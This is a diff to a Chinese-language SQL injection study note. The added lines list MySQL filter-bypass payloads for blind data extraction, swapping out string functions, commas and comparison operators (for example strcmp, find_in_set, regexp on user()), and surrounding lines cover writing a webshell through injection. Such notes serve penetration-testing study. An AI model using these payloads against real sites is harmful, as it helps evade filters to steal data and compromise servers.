@@ -13,6 +13,7 @@
 - [二阶注入？](#二阶注入)
 - [**sql注入写文件用的函数？](#sql注入写文件用的函数)
 - [**sql注入写shell的条件？(利用sql注入拿到webshell)](#sql注入写shell的条件利用sql注入拿到webshell)
+- [如何判断不同的数据库](#如何判断不同的数据库)
 - [不同数据库获取数据信息的过程](#不同数据库获取数据信息的过程)
 - [mysql 5.0以上和以下区别](#mysql-50以上和以下区别)
 
@@ -140,6 +141,24 @@
 - 只过滤了一次时
   - union => ununionion
 - 相同功能替换
+  - 截取字符串
+    - select mid(string,1,1)
+    - select substr(string from 1 for 1)
+    - select replace(LPAD(string,1,1),LPAD(string,1-1,1),"")  # 读取string的第一位
+    - select replace(LPAD(string,2,1),LPAD(string,2-1,1),"")  # 读取string的第二位
+    > LPAD(str,len,padstr) 返回字符串str，用padstr左填充至len字符长度
+    ![](images/mysql_LPAD.png)
+  - 逗号过滤
+    - case when then else 代替if
+    - union select 1,2,3-->union select * from (select 1)a join (select 2)b join (select 3)c
+    - limit 2,1 -->limit 1 offset 2
+  - 比较表达式过滤(=<>)
+    - 利用**strcmp**  `if(abs(strcmp((ascii(mid(user()from(1)for(2)))),114))-1,1,0)`
+    - 利用**find_in_set**  `select find_in_set(ord(mid(user() from 1 for 1)),114)`
+    - 利用**regexp**  `select ord('r') regexp 115`;
+    - `least(ord('r'),115)`  返回N个数中最小的
+    - `greatest(ord('r'),113)`  返回N个数中最大的
+    - `expr between n and m`  当expr值大于n小于m时返回1，否则返回0
   - 函数替换
     - substring / mid / sub
     - ascii / hex / bin
@@ -376,6 +395,8 @@ set global general_log=off;                             #关闭general log模式
 - 当前数据库用户权限，用户拥有FILE权限，即在写入文件的路径中有写入权限
 - web目录的物理路径(绝对路径)
   - 一般可以通过phpinfo函数，测试页面，及报错信息，搜素引擎，目录爆破的方式来获取网站的真实物理路径，
+
+## 如何判断不同的数据库
 
 
 ## 不同数据库获取数据信息的过程
